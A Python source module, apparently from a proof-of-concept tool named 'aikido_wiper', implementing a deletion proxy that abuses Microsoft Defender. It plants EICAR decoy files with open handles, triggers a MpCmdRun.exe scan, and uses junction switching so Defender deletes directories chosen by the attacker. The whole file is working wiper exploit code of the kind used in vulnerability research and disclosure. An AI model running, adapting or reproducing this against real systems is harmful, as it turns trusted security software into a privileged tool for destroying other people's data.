import os
import subprocess
from typing import Iterable
import win32file

from aikido_wiper.indirect_ops.delete.junction_switch_proxy import JunctionSwitchDeleteProxy, DecoyPath

class MicrosoftDefenderDeleteProxy(JunctionSwitchDeleteProxy):
    """
    A deletion proxy that uses Microsoft's Windows Defender or Windows Defender
    For endpoint in order to delete directories.
    """

    def __init__(self, decoy_dir_path: str) -> None:
        """
        Read parent class doc.
        Also, uses one junction dir for all decoys.
        """
        super().__init__(use_one_junction_dir=True, decoy_dir_path=decoy_dir_path)
        self.__target_paths_to_open_handles = {}
        self.__defender_scan_happened = False

    def indirect_delete_paths(self, paths_to_delete: Iterable[str]) -> set[str]:
        """
        Read parent class doc.
        Also, the Microsoft Defender proxy is not able to delete specific files, only
        directories. When it deletes a directory, then it starts to delete all its files
        until it hits a file it can't delete and then stops.
        """
        for path in paths_to_delete:
            if not os.path.isdir(path):
                raise NotADirectoryError(f"{type(self).__name__} supports directory deletion only. {path} is not a directory")

        return super().indirect_delete_paths(paths_to_delete)

    def _before_junction_switch(self, decoy_path: DecoyPath) -> None:
        """
        Read parent doc.
        Also, triggers Defender to scan the decoys only if it's the first time the callback was called for a set
        of paths to delete. Defender should try to delete them and give up. After Defender gave up, The function
        closes the handle to the decoy file which was left open.
        """
        if not self.__defender_scan_happened:
            self.__defender_scan_happened = True
            self.__trigger_defender_scan(self._decoys_root_dir_path)

        win32file.CloseHandle(self.__target_paths_to_open_handles[decoy_path.path_to_delete])
        self.__target_paths_to_open_handles.pop(decoy_path.path_to_delete)

    def _after_junction_switch(self, decoy_path: DecoyPath) -> str:
        self.__defender_scan_happened = False

    def __trigger_defender_scan(self, path_to_scan):
        """
        Triggers Defender to scan a specific folder for malicious files. If malicious files were detected, Defender
        is most likely to also try to delete them. The function blocks until Defender finishes scanning, 
        deleting or moving a file to quarantine.

        :param path_to_scan: The path to scan using Defender.
        """
        scan_cmd = f"\"{self._windows_drive}\\Program Files\\Windows Defender\\MpCmdRun.exe\" -Scan -ScanType 3 -File \"{path_to_scan}\""
        scan_process = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        scan_process.wait()

    def _create_decoy_file(self, decoy_path: DecoyPath) -> None:
        """
        Read parent class doc.
        Also, after creating the decoy file, the handle to it is left open and stored so it can be closed later.
        """
        eicar_file_path = os.path.join(decoy_path.decoy_deepest_dir, os.path.basename(decoy_path.path_to_delete))
        eicar_file_handle = win32file.CreateFile(eicar_file_path,  win32file.GENERIC_READ | win32file.GENERIC_WRITE, win32file.FILE_SHARE_READ, None, win32file.CREATE_NEW, 0, 0)
        win32file.WriteFile(eicar_file_handle, self._get_decoded_eicar(), None)
        
        self.__target_paths_to_open_handles[decoy_path.path_to_delete] = eicar_file_handle